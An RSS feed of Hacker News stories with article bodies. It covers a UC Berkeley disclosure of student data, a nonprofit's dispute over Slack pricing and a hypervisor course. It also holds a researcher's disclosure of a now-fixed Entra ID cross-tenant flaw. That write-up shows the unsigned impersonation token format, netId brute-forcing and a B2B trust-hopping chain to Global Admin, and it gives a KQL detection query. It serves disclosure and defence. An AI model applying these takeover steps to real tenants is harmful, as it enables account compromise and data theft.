<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 18 Sep 2025 09:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[UC Berkeley gives personal information for 150 students and staff to government (122 pts)]]></title>
            <link>https://www.dailycal.org/news/campus/uc-berkeley-turns-over-personal-information-of-more-than-150-students-and-staff-to-federal/article_a4aad3e1-bbba-42cc-92d7-a7964d9641c5.html</link>
            <guid>45284477</guid>
            <pubDate>Thu, 18 Sep 2025 02:33:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.dailycal.org/news/campus/uc-berkeley-turns-over-personal-information-of-more-than-150-students-and-staff-to-federal/article_a4aad3e1-bbba-42cc-92d7-a7964d9641c5.html">https://www.dailycal.org/news/campus/uc-berkeley-turns-over-personal-information-of-more-than-150-students-and-staff-to-federal/article_a4aad3e1-bbba-42cc-92d7-a7964d9641c5.html</a>, See on <a href="https://news.ycombinator.com/item?id=45284477">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-body" itemprop="articleBody" false="">
                                <meta itemprop="isAccessibleForFree" content="true">
                                
                                
                                <p>UC Berkeley has provided the personal information of roughly 160 students, staff and faculty to the federal government in a directive from the UC Office of the President.&nbsp;</p><p dir="ltr"><span>In an attempt to comply with an</span> <a href="https://www.dailycal.org/news/campus/department-of-education-announces-antisemitism-inquiries-into-uc-berkeley-and-4-other-universities/article_ec4465a6-e389-11ef-b66c-03a9cd0727a9.html"><span>investigation</span></a> <span>into alleged campus antisemitism by the Department of Education, Office of Civil Rights, or OCR, UC Berkeley released the names of individuals and their “potential connection” to reports of alleged antisemitism, according to an email from campus spokesperson Janet Gilmore.&nbsp;</span></p><p dir="ltr"><span>Affected individuals received an email Sept. 4 from the campus Office of Legal Affairs notifying them that their names and information had been released. The message said the information had been disclosed over two weeks earlier.&nbsp;</span></p><p dir="ltr"><span>“As part of its investigation, OCR required production of comprehensive documents, including files and reports related to alleged antisemitic incidents,” the Office of Legal Affairs email read. “This notice is to inform you that, as required by law and as per directions provided by the UC systemwide Office of General Counsel (OGC), your name was included in reports as part of the documents provided by OGC to OCR for its investigation on August 18, 2025.”</span></p><p dir="ltr"><span>One campus graduate student, who received the message and was provided anonymity due to fears of retaliation, claimed the release targeted Muslim and Arab individuals who had previously expressed support for Palestine.&nbsp;&nbsp;</span></p><p dir="ltr"><span>“I think (the message was sent) to anybody who has ever been accused of antisemitism, which of course, includes a lot of Palestinians,” the student said. “Whenever we teach about Palestine, it usually leads to an investigation. I think they flagged and sent all of that information to the federal government.”</span></p><p dir="ltr"><span>The student claimed they had been the subject of a false report of antisemitism to the campus Title IX and XI Office for the Prevention of Harassment and Discrimination, or OPHD. They said other students who received the notification had OPHD cases that were determined to be unsubstantiated or stand open.&nbsp;</span></p><p dir="ltr"><span>While OPHD is the primary office for any harassment or discrimination reports, Gilmore said documents were sent from, “multiple campus offices to address (OCR’s) questions regarding campus handling of antisemitism on campus.”&nbsp;</span></p><p dir="ltr"><span>Campus officials did not say which offices provided information or what criteria were used to determine which individuals were associated with “antisemitism.”&nbsp;</span></p><p dir="ltr"><span>In February, the Department of Education</span> <a href="https://www.dailycal.org/news/campus/department-of-education-announces-antisemitism-inquiries-into-uc-berkeley-and-4-other-universities/article_ec4465a6-e389-11ef-b66c-03a9cd0727a9.html"><span>initiated</span></a> <span>an investigation into UC Berkeley’s handling of campus antisemitism. This, alongside an</span> <a href="https://www.dailycal.org/news/campus/department-of-justice-to-investigate-antisemitism-claims-against-the-university-of-california/article_7bc53322-fb31-11ef-85b8-8b9125661cf5.html"><span>investigation</span></a> <span>from the DOJ and Chancellor Rich Lyons’s</span> <a href="https://www.dailycal.org/news/national/uc-berkeley-chancellor-weathers-political-storm-in-house-antisemitism-hearing/article_589e8a3d-2a61-4a12-8e9b-ecdc8d47fa66.html"><span>testimony</span></a> <span>to Congress&nbsp; this summer represent a year-long crackdown on universities following the 2024 pro-Palestine encampments.&nbsp;</span></p><p dir="ltr"><span>Alongside UC Berkeley, UCSF, UCLA, UC Davis and UC San Diego have been targeted in Department of Education antisemitism inquiries. According to the campus grad student, some of these campuses also released student information to OCR at the direction of UCOP.&nbsp;</span></p><p dir="ltr"><span>However, these campuses did not send notifications to affected individuals, the student said. Alongside campus community members, the student said they notified pro-Palestinian groups across the UC that their members' personal information may have been shared with the federal government.&nbsp;</span></p><p dir="ltr"><span>UCOP did not comment on the compliance of other campuses or the specific directives given to UC Berkeley.</span></p><p dir="ltr"><span>In a Sunday Instagram post, UC Berkeley Students for Justice in Palestine, or SJP, decried the university for its “betrayal” to students, claiming campus administrators had previously provided them assurances that “identities would remain protected.”&nbsp;</span></p><p dir="ltr"><span>“Chancellor Rich Lyons should not have given assurances that he wouldn't be giving our information to the federal government,” the student said. “Beyond that, he should never have bowed down so easily. I would think that a university that prides itself on being this liberal haven would at least stand up to a fascist like Donald Trump.”&nbsp;</span></p><p dir="ltr"><span>In the final line of the email notification, the Office of Legal Affairs said the OCR investigation is still ongoing and further disclosures could be required.&nbsp;</span></p><p dir="ltr"><span>Moreover, the student and other individuals affected by the disclosure said this action has made them fearful, as they worry about how the information is going to be used by the Trump administration.&nbsp;</span></p><p dir="ltr"><span>“We’re concerned about how are they going to use that information to further repress us not only on campus, but also in our everyday lives,” the student said.” One of the things that I'm getting ready to do is my research year; and now I have to consult lawyers about even if it's safe to do my research, which is what I came here to do.”</span></p>
                                
                                
                            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: The text disappears when you screenshot it (213 pts)]]></title>
            <link>https://unscreenshottable.vercel.app/?text=Hello</link>
            <guid>45284311</guid>
            <pubDate>Thu, 18 Sep 2025 02:18:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://unscreenshottable.vercel.app/?text=Hello">https://unscreenshottable.vercel.app/?text=Hello</a>, See on <a href="https://news.ycombinator.com/item?id=45284311">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Slack is extorting us with a $195k/yr bill increase (1115 pts)]]></title>
            <link>https://skyfall.dev/posts/slack</link>
            <guid>45283887</guid>
            <pubDate>Thu, 18 Sep 2025 01:37:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://skyfall.dev/posts/slack">https://skyfall.dev/posts/slack</a>, See on <a href="https://news.ycombinator.com/item?id=45283887">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <div>  <p>An open letter, or something</p> </div> <p><time datetime="2025-09-18T18:00:00.000Z"> September 18th 2025 </time> </p>  </div><div>  <p>For nearly 11 years, Hack Club - a nonprofit that provides coding education and community to teenagers worldwide - has used Slack as the tool for communication. We weren’t freeloaders. A few years ago, when Slack transitioned us from their free nonprofit plan to a $5,000/year arrangement, we happily paid. It was reasonable, and we valued the service they provided to our community.</p>
<p>However, two days ago, Slack reached out to us and said that if we don’t agree to pay an extra $50k <strong>this week</strong> and $200k a year, they’ll deactivate our Slack workspace and delete all of our message history.</p>
<p>One could argue that Slack is free to stop providing us the nonprofit offer at any time, but in my opinion, a six month grace period is the <em>bare minimum</em> for a massive hike like this, if not more. Essentially, Salesforce (a <strong>$230 billion</strong> company) is strong-arming a small nonprofit for teens, by providing less than a week to pony up a pretty massive sum of money, or risk cutting off all our communications. That’s absurd.</p>
<h2 id="the-impact">The impact</h2>
<p>The small amount of notice has also been catastrophic for the programs that we run. Dozens of our staff and volunteers are now scrambling to update systems, rebuild integrations and migrate <em>years</em> of institutional knowledge. The opportunity cost of this forced migration is simply staggering.</p>
<p><img width="752" height="55" alt="image" src="https://github.com/user-attachments/assets/48097101-1521-4f50-b970-9557a0b7eefd">
<img width="1146" height="103" alt="image" src="https://github.com/user-attachments/assets/f09902a1-42cb-4cd7-9a32-21cdbfb3fd05">
<img width="1146" height="134" alt="image" src="https://github.com/user-attachments/assets/dbfc784a-d06b-44d8-a050-ec8c16c5a98b">
<img width="611" height="274" alt="image" src="https://github.com/user-attachments/assets/8a41302f-2e5f-41c1-933f-d856094c587a"></p><p>Anyway, we’re moving to Mattermost. This experience has taught us that owning your data is incredibly important, and if you’re a small business especially, then I’d advise you move away too.</p>
<hr>
<p><em>This post was rushed out because, well, this has been a shock! If you’d like any additional details then feel free to send me an email.</em></p>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hypervisor 101 in Rust (109 pts)]]></title>
            <link>https://tandasat.github.io/Hypervisor-101-in-Rust/</link>
            <guid>45283731</guid>
            <pubDate>Thu, 18 Sep 2025 01:18:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tandasat.github.io/Hypervisor-101-in-Rust/">https://tandasat.github.io/Hypervisor-101-in-Rust/</a>, See on <a href="https://news.ycombinator.com/item?id=45283731">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page-wrapper">

            <div id="content" class="page">
                    <main>
                        <h2 id="welcome-to-hypervisor-101-in-rust"><a href="#welcome-to-hypervisor-101-in-rust">Welcome to Hypervisor 101 in Rust</a></h2>
<p>This is a day long course to quickly learn the inner working of hypervisors and techniques to write them for high-performance fuzzing.</p>
<p>This course covers foundation of hardware-assisted virtualization technologies, such as VMCS/VMCB, guest-host world switches, EPT/NPT, as well as useful features and techniques such as exception interception for virtual machine introspection for fuzzing.</p>
<p>The class is made up of lectures using the materials within this directory and hands-on exercises with source code under the <code>Hypervisor-101-in-Rust/hypervisor</code> directory.</p>
<p>This lecture materials are written for the <code>gcc2023</code> branch, which notionally have incomplete code for step-by-step exercises. Check out the starting point of the branch as below to go over hands-on exercises before you start.</p>
<pre><code>git checkout b17a59dd634a7b0c2b9a6d493fc9b0ff22dcfce5
</code></pre>

                    </main>

                    <nav aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->

                            <a rel="next prefetch" href="https://tandasat.github.io/Hypervisor-101-in-Rust/introduction/prerequisites.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i></i>
                            </a>

                        
                    </nav>
                </div>

            <nav aria-label="Page navigation">

                    <a rel="next prefetch" href="https://tandasat.github.io/Hypervisor-101-in-Rust/introduction/prerequisites.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i></i>
                    </a>
            </nav>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta Ray-Ban Display (395 pts)]]></title>
            <link>https://www.meta.com/blog/meta-ray-ban-display-ai-glasses-connect-2025/</link>
            <guid>45283306</guid>
            <pubDate>Thu, 18 Sep 2025 00:30:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.meta.com/blog/meta-ray-ban-display-ai-glasses-connect-2025/">https://www.meta.com/blog/meta-ray-ban-display-ai-glasses-connect-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=45283306">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[One Token to rule them all – Obtaining Global Admin in every Entra ID tenant (192 pts)]]></title>
            <link>https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/</link>
            <guid>45282497</guid>
            <pubDate>Wed, 17 Sep 2025 23:03:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/">https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/</a>, See on <a href="https://news.ycombinator.com/item?id=45282497">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
        <header>
          
          
            <p> 




  17 minute read
</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>While preparing for my Black Hat and DEF CON talks in July of this year, I found the most impactful Entra ID vulnerability that I will probably ever find. This vulnerability could have allowed me to compromise every Entra ID tenant in the world (except probably those in national cloud deployments<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>). If you are an Entra ID admin reading this, yes that means complete access to your tenant. The vulnerability consisted of two components: undocumented impersonation tokens, called “Actor tokens”, that Microsoft uses in their backend for service-to-service (S2S) communication. Additionally, there was a critical flaw in the (legacy) Azure AD Graph API that failed to properly validate the originating tenant, allowing these tokens to be used for cross-tenant access.</p>

<p>Effectively this means that with a token I requested in my lab tenant I could authenticate as <em>any user</em>, including Global Admins, in <em>any other tenant</em>. Because of the nature of these Actor tokens, they are not subject to security policies like Conditional Access, which means there was no setting that could have mitigated this for specific hardened tenants. Since the Azure AD Graph API is an older API for managing the core Azure AD / Entra ID service, access to this API could have been used to make any modification in the tenant that Global Admins can do, including taking over or creating new identities and granting them any permission in the tenant. With these compromised identities the access could also be extended to Microsoft 365 and Azure.</p>

<p>I reported this vulnerability the same day to the Microsoft Security Response Center (MSRC). Microsoft fixed this vulnerability on their side within days of the report being submitted and has rolled out further mitigations that block applications from requesting these Actor tokens for the Azure AD Graph API. Microsoft also issued <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55241">CVE-2025-55241</a> for this vulnerability.</p>

<h2 id="impact">Impact</h2>
<p>These tokens allowed full access to the Azure AD Graph API in any tenant. Requesting Actor tokens does not generate logs. Even if it did they would be generated in my tenant instead of in the victim tenant, which means there is no record of the existence of these tokens.</p>

<p>Furthermore, the Azure AD Graph API does not have API level logging. Its successor, the Microsoft Graph, does have this logging, but for the Azure AD Graph this telemetry source is still in a very limited preview and I’m not aware of any tenant that currently has this available. Since there is no API level logging, it means the following Entra ID data could be accessed without any traces:</p>

<ul>
  <li>User information including all their personal details stored in Entra ID.</li>
  <li>Group and role information.</li>
  <li>Tenant settings and (Conditional Access) policies.</li>
  <li>Applications, Service Principals, and any application permission assignment.</li>
  <li>Device information and BitLocker keys synced to Entra ID.</li>
</ul>

<p>This information could be accessed by impersonating a regular user in the victim tenant. If you want to know the full impact, my tool <a href="https://github.com/dirkjanm/ROADtools">roadrecon</a> uses the same API, if you run it then everything you find in the GUI of the tool could have been accessed and modified by an attacker abusing this flaw.</p>

<p>If a Global Admin was impersonated, it would also be possible to <strong>modify</strong> any of the above objects and settings. This would result in full tenant compromise with access to any service that uses Entra ID for authentication, such as SharePoint Online and Exchange Online. It would also provide full access to any resource hosted in Azure, since these resources are controlled from the tenant level and Global Admins can grant themselves rights on Azure subscriptions. Modifying objects in the tenant does (usually) result in audit logs being generated. That means that while theoretically all data in Microsoft 365 could have been compromised, doing anything other than reading the directory information would leave audit logs that could alert defenders, though without knowledge of the specific artifacts that modifications with these Actor tokens generate, it would appear as if a legitimate Global Admin performed the actions.</p>

<p>Based on Microsoft’s internal telemetry, they did not detect any abuse of this vulnerability. If you want to search for possible abuse artifacts in your own environment, a KQL detection is included at the end of this post.</p>

<h2 id="technical-details">Technical details</h2>
<h2 id="actor-tokens">Actor tokens</h2>
<p>Actor tokens are tokens that are issued by the “Access Control Service”. I don’t know the exact origins of this service, but it appears to be a legacy service that is used for authentication with SharePoint applications and also seems to be used by Microsoft internally. I came across this service while investigating hybrid Exchange setups. These hybrid setups used to provision a certificate credential on the Exchange Online Service Principal (SP) in the tenant, with which it can perform authentication. These hybrid attacks were the topic of some talks I did this summer, the slides are on the <a href="https://dirkjanm.io/talks/">talks</a> page. In this case the hybrid part is not relevant, as in my lab I could also have added a credential on the Exchange Online SP without the complete hybrid setup. Exchange is not the only app which can do this, but since I found this in Exchange we will keep talking about these tokens in the context of Exchange.</p>

<p>Exchange will request Actor tokens when it wants to communicate with other services on behalf of a user. The Actor token allows it to “act” as another user in the tenant when talking to Exchange Online, SharePoint and as it turns out the Azure AD Graph. The Actor token (a JSON Web Token / JWT) looks as follows when decoded:</p>

<div><pre><code>{
    "alg": "RS256",
    "kid": "_jNwjeSnvTTK8XEdr5QUPkBRLLo",
    "typ": "JWT",
    "x5t": "_jNwjeSnvTTK8XEdr5QUPkBRLLo"
}
{
    "aud": "00000002-0000-0000-c000-000000000000/graph.windows.net@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "exp": 1752593816,
    "iat": 1752507116,
    "identityprovider": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "iss": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nbf": 1752507116,
    "oid": "a761cbb2-fbb6-4c80-aa50-504962316eb2",
    "rh": "1.AXQAj_KHYn9PIkOWUahpfY_hvAIAAAAAAAAAwAAAAAAAAACtAQB0AA.",
    "sub": "a761cbb2-fbb6-4c80-aa50-504962316eb2",
    "trustedfordelegation": "true",
    "xms_spcu": "true"
}.[signature from Entra ID]
</code></pre></div>

<p>There are a few fields here that differ from regular Entra ID access tokens:</p>

<ul>
  <li>The <code>aud</code> field contains the GUID of the Azure AD Graph API, as well as the URL <code>graph.windows.net</code> and the tenant it was issued to <code>6287f28f-4f7f-4322-9651-a8697d8fe1bc</code>.</li>
  <li>The expiry is exactly 24 hours after the token was issued.</li>
  <li>The <code>iss</code> contains the GUID of the Entra ID token service itself, called “Azure ESTS Service”, and again the tenant GUID where it was issued.</li>
  <li>The token contains the claim <code>trustedfordelegation</code>, which is <code>True</code> in this case, meaning we can use this token to impersonate other identities. Many Microsoft apps could request such tokens. Non-Microsoft apps requesting an Actor token would receive a token with this field set to <code>False</code> instead.</li>
</ul>

<p>When using this Actor token, Exchange would embed this in an <strong>unsigned</strong> JWT that is then sent to the resource provider, in this case the Azure AD graph. In the rest of the blog I call these <strong>impersonation tokens</strong> since they are used to impersonate users.</p>

<div><pre><code>{
    "alg": "none",
    "typ": "JWT"
}
{
    "actortoken": "eyJ0eXAiOiJKV1Qi&lt;snip&gt;TxeLkNB8v2rWWMLGpaAaFJlhA",
    "aud": "00000002-0000-0000-c000-000000000000/graph.windows.net@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "exp": 1756926566,
    "iat": 1756926266,
    "iss": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "10032001E2CBE43B",
    "nbf": 1756926266,
    "nii": "urn:federation:MicrosoftOnline",
    "sip": "doesnt@matter.com",
    "smtp": "doesnt@matter.com",
    "upn": "doesnt@matter.com"
}.[no signature]
</code></pre></div>

<p>The <code>sip</code>, <code>smtp</code>, <code>upn</code> fields are used when accessing resources in Exchange online or SharePoint, but are ignored when talking to the Azure AD Graph, which only cares about the <code>nameid</code>. This <code>nameid</code> originates from an attribute of the user that is called the <code>netId</code> on the Azure AD Graph. You will also see it reflected in tokens issued to users, in the <code>puid</code> claim, which stands for Passport UID. I believe these identifiers are an artifact from the original codebase which Microsoft used for its Microsoft Accounts (consumer accounts or MSA). They are still used in Entra ID, for example to map guest users to the original identity in their home tenant.</p>

<p>As I mentioned before, these impersonation tokens are not signed. That means that once Exchange has an Actor token, it can use the one Actor token to impersonate anyone against the target service it was requested for, for 24 hours. In my personal opinion, this whole Actor token design is something that never should have existed. It lacks almost every security control that you would want:</p>

<ul>
  <li>There are no logs when Actor tokens are issued.</li>
  <li>Since these services can craft the unsigned impersonation tokens without talking to Entra ID, there are also no logs when they are created or used.</li>
  <li>They cannot be revoked within their 24 hours validity.</li>
  <li>They completely bypass any restrictions configured in Conditional Access.</li>
  <li>We have to rely on logging from the resource provider to even know these tokens were used in the tenant.</li>
</ul>

<p>Microsoft uses these tokens to talk to other services in their backend, something that Microsoft calls service-to-service (S2S) communication. If one of these tokens leaks, it can be used to access all the data in an entire tenant without any useful telemetry or mitigation. In July of this year, Microsoft did publish <a href="https://www.microsoft.com/en-us/security/blog/2025/07/08/enhancing-microsoft-365-security-by-eliminating-high-privilege-access/">a blog</a> about removing these insecure legacy practices from their environment, but they do not provide any transparency about how many services still use these tokens.</p>

<h2 id="the-fatal-flaw-leading-to-cross-tenant-compromise">The fatal flaw leading to cross-tenant compromise</h2>
<p>As I was refining my slide deck and polished up my proof-of-concept code for requesting and generating these tokens, I tested more variants of using these tokens, changing various fields to see if the tokens still worked with the modified information. As one of the tests I changed the tenant ID of the impersonation token to a different tenant in which none of my test accounts existed. The Actor tokens tenant ID was my <code>iminyour.cloud</code> tenant, with tenant ID <code>6287f28f-4f7f-4322-9651-a8697d8fe1bc</code> and the unsigned JWT generated had the tenant ID <code>b9fb93c1-c0c8-4580-99f3-d1b540cada32</code>.</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/tenantchange.png" alt="Changed tenant ID"></p>

<p>I sent this token to <code>graph.windows.net</code> using my CLI tool <code>roadtx</code>, expecting a generic access denied since I had a tenant ID mismatch. However, I was instead greeted by a curious error message:</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/usernotfound.png" alt="Error message indicating the user does not exist"></p>

<p><em>Note that these are the actual screenshots I made during my research, which is why the formatting may not work as well in this blog</em></p>

<p>The error message suggested that while my token was valid, the identity could not be found in the tenant. Somehow the API seemed to accept my token even with the mismatching tenant. I quickly looked up the <code>netId</code> of a user that did exist in the target tenant, crafted a token and the Azure AD Graph happily returned the data I requested. I tested this in a few more test tenants I had access to, to make sure I was not crazy, but I could indeed access data in other tenants, as long as I knew their tenant ID (which is public information) and the <code>netId</code> of a user in that tenant.</p>

<p>To demonstrate the vulnerability, here I am using a Guest user in the target tenant to query the <code>netId</code> of a Global Admin. Then I impersonate the Global Admin using the same Actor token, and can perform any action in the tenant as that Global Admin over the Azure AD Graph.</p>

<p>First I craft an impersonation token for a Guest user in my victim tenant:</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/guesttoken.png" alt="Craft impersonation token for Guest user"></p>

<p>I use this token to query the <code>netId</code> of a Global Admin:</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/findga.png" alt="Query Global Admin"></p>

<p>Then I create an impersonation token for this Global Admin (the UPN is kept the same since it is not validated by the API):</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/gaimpersonate.png" alt="Craft impersonation token for Global Admin"></p>

<p>And finally this token is used to access the tenant as the Global Admin, listing the users, something the guest user was not able to do:</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/queryusers.png" alt="Query data in the tenant"></p>

<p>I can even run roadrecon with this impersonation token, which queries all Azure AD Graph API endpoints to enumerate the available information in the tenant.</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/runroadrecon.png" alt="Running roadrecon in a tenant with an impersonation token"></p>

<p>None of these actions would generate any logs in the victim tenant.</p>

<h2 id="practical-abuse">Practical abuse</h2>
<p>With this vulnerability it would be possible to compromise any Entra ID tenant. Starting with an Actor token from an attacker controlled tenant, the following steps would lead to full control over the victim tenant:</p>

<ol>
  <li>Find the tenant ID for the victim tenant, this can be done using public APIs based on the domain name.</li>
  <li>Find a valid <code>netId</code> of a regular user in the tenant. Methods for this will be discussed below.</li>
  <li>Craft an impersonation token with the Actor token from the attacker tenant, using the tenant ID and <code>netId</code> of the user in the victim tenant.</li>
  <li>List all Global Admins in the tenant and their <code>netId</code>.</li>
  <li>Craft an impersonation token for the Global Admin account.</li>
  <li>Perform any read or write action over the Azure AD Graph API.</li>
</ol>

<p>If an attacker makes any modifications in the tenant in step 6, that would be the only event in this chain that generates any telemetry in the victim tenant. An attacker could for example create new user accounts, grant these Global Admin privileges and then sign in interactively to any Entra ID, Microsoft 365 or third party application that integrates with the victim tenant. Alternatively they could add credentials on existing applications, grant these apps API permissions and use that to exfiltrate emails or files from Microsoft 365, a technique that is popular among threat actors. An attacker could also add credentials to <a href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">Microsoft Service Principals</a> in the victim tenant, several of which can request Actor tokens that allow impersonation against SharePoint or Exchange. For my DEF CON and Black Hat talks I made a demo video about using these Actor tokens to obtain Global Admin access. The video uses Actor tokens within a tenant, but the same technique could have been applied to any other tenant by abusing this vulnerability.</p>

<video width="100%" controls="">
  <source src="https://dirkjanm.io/assets/raw/demo_graph.mp4" type="video/mp4">
</video>

<h2 id="finding-netids">Finding netIds</h2>
<p>Since tenant IDs can be resolved when the domain name of a tenant is known, the only identifier that is not immediately available to the attacker is a valid <code>netId</code> for a user in that specific tenant. As I mentioned above, these IDs are added to Entra ID access tokens as the <code>puid</code> claim. Any token found online, in screenshots, examples or logs, even those that are long expired or with an obfuscated signature, would provide an attacker with enough information to breach the tenant. Threat actors that still have old tokens for any tenant from previous breaches can immediately access those tenants again as long as the victim account still exists.</p>

<p>The above is probably not a very common occurrence. What is a more realistic attack is simply brute-forcing the <code>netId</code>. Unlike object IDs, which are randomly generated, netIds are actually incremental. Looking at the differences in netIds between my tenant and those of some tenants I analyzed, I found the difference between a newly created user in my tenant and their newest user to be in the range of 100.000 to 100 million. Simply brute forcing the <code>netId</code> could be accomplished in minutes to hours for any target tenant, and the more user exist in a tenant the easier it is to find a match. Since this does not generate any logs it isn’t a noisy attack either. Because of the possibility to brute force these netIds I would say this vulnerability could have been used to take over any tenant without any prerequisites. There is however a third technique which is even more effective (and more fun from a technical level).</p>

<h2 id="compromising-tenants-by-hopping-over-b2b-trusts">Compromising tenants by hopping over B2B trusts</h2>
<p>I previously mentioned that a users <code>netId</code> is used to establish links between a user account in multiple tenants. This is something that I researched a few years ago when I gave a talk at <a href="https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf">Black Hat USA 22</a> about external identities. The below screenshot is taken from one of my slides, which illustrates this:</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/guestlink.png" alt="Guest user link based on netid"></p>

<p>The way this works is as follows. Suppose we have tenant A and tenant B. A user in tenant B is invited into tenant A. In the new guest account that is created in tenant A, their <code>netId</code> is stored on the <code>alternativeSecurityIds</code> attribute. That means that an attacker wanting to abuse this bug can simply read that attribute in tenant A, put it in an impersonation token for tenant B and then impersonate the victim in their home tenant. It should be noted that this works <strong>against the direction of invite</strong>. Any user in any tenant where you accept an invite will be able to read your <code>netId</code>, and with this bug could have impersonated you in your home tenant. In your home tenant you have a full user account, which can enumerate other users. This is not a bug or risk with B2B trusts, but is simply an unintended consequence of the B2B design mechanism. A guest account in someone else’s tenant would also be sufficient with the default Entra ID guest settings because the default settings allow users to query the <code>netId</code> of a user as long as the UPN is known.</p>

<p>To abuse this, a threat actor could perform the following steps, given that they have access to at least one tenant with a guest user:</p>

<ol>
  <li>Query the guest users and their <code>alternativeSecurityIds</code> attribute which gives the <code>netId</code>.</li>
  <li>Query the tenant ID of the guest users home tenant based on the domain name in their UPN.</li>
  <li>Create an impersonation token, impersonating the victim in their home tenant.</li>
  <li>Optionally list Global Admins and impersonate those to compromise the entire tenant.</li>
  <li>Repeat step 1 for each tenant that was compromised.</li>
</ol>

<p>The steps above can be done in 2 API calls per tenant, which do not generate any logs. Most tenants will have guest users from multiple distinct other tenants. This means the number of tenants you compromise with this scales exponentially and the information needed to compromise the majority of all tenants worldwide could have been gathered within minutes using a single Actor token. After at least 1 user is known per victim tenant, the attacker can selectively perform post-compromise actions in these tenants by impersonating Global Admins.</p>

<p>Looking at the list of guest users in the tenants of some of my clients, this technique would be extremely powerful. I also observed that one of the first tenants you will likely compromise is Microsoft’s own tenant, since Microsoft consultants often get invited to customer tenants. Many MSPs and Microsoft Partners will have a guest account in the Microsoft tenant, so from the Microsoft tenant a compromise of most major service provider tenants is one step away.</p>

<p>Needless to say, as much as I would have liked to test this technique in practice to see how fast this would spread out, I only tested the individual steps in my own tenants and did not access any data I’m not authorized to.</p>

<h2 id="detection">Detection</h2>
<p>While querying data over the Azure AD Graph does not leave any logs, modifying data does (usually) generate audit logs. If modifications are done with Actor tokens, these logs look a bit curious.</p>

<p><img src="https://dirkjanm.io/assets/img/actortokens/initiatedby.png" alt="Initiated by exchange and a global admin" width="60%"></p>

<p>Since Actor tokens involve both the app and the user being impersonated, it seems Entra ID gets confused about who actually made the change, and it will log the UPN of the impersonated Global Admin, but the display name of Exchange. Luckily for defenders this creates a nice giveaway when Actor tokens are used in the tenant. After some testing and filtering with some fellow researchers that work on the blue side (thanks to Fabian Bader and Olaf Hartong) we came up with the following detection query:</p>

<pre><code>AuditLogs
| where not(OperationName has "group")
| where not(OperationName == "Set directory feature on tenant")
| where InitiatedBy has "user"
| where InitiatedBy.user.displayName has_any ( "Office 365 Exchange Online", "Skype for Business Online", "Dataverse", "Office 365 SharePoint Online", "Microsoft Dynamics ERP")
</code></pre>

<p>The exclusion for group operations is there because some of these products do actually use Actor tokens to perform operations on your behalf. For example creating specific groups via the Exchange Online PowerShell module will make Exchange use an Actor token on your behalf and create the group in Entra ID.</p>

<h2 id="conclusion">Conclusion</h2>
<p>This blog discussed a critical token validation failure in the Azure AD Graph API. While the vulnerability itself was a bad oversight in the token handling, the whole concept of Actor tokens is a protocol that was designed to behave with all the properties mentioned in the paragraphs above. If it weren’t for the complete lack of security measures in these tokens, I don’t think such a big impact with such limited telemetry would have been possible.</p>

<p>Thanks to the people at MSRC who immediately picked up the vulnerability report, searched for potential variants in other resources, and to the engineers who followed up with fixes for the Azure AD Graph and blocked Actor tokens for the Azure AD Graph API requested with credentials stored on Service Principals, essentially restricting the usage of these Actor tokens to only Microsoft internal services.</p>

<h2 id="disclosure-timeline">Disclosure timeline</h2>

<ul>
  <li>July 14, 2025 - reported issue to MSRC.</li>
  <li>July 14, 2025 - MSRC case opened.</li>
  <li>July 15, 2025 - reported further details on the impact.</li>
  <li>July 15, 2025 - MSRC requested to halt further testing of this vulnerability.</li>
